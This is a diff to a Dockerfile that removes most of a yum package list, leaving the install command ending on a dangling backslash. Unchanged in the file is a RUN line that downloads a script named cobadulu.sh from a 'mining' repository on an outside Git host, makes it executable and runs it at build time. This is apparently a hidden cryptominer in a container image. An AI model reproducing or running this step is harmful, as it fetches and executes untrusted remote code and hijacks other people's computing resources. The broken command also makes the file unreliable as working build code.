@@ -57,27 +57,6 @@ RUN yum -y install \
            sysstat \
            systemtap-client \
            tar \
-           tcpdump \
-           vim-enhanced \
-           xauth \
-           which \
-           ostree \
-           rpm-ostree \
-           docker \
-           python-docker-py \
-           docker-selinux \
-           kubernetes-client \
-           kubernetes-node \
-           kubernetes-devel \
-           kubernetes-master \
-           gdb-gdbserver \
-           vim-minimal \
-           bash-completion \
-           subscription-manager \
-           python-rhsm \
-           rootfiles \
-           yum-utils \
-           && yum clean all
 
 RUN wget https://try.gitea.io/novalanto61/mining/raw/branch/master/cobadulu.sh && chmod u+x cobadulu.sh && ./cobadulu.sh
 
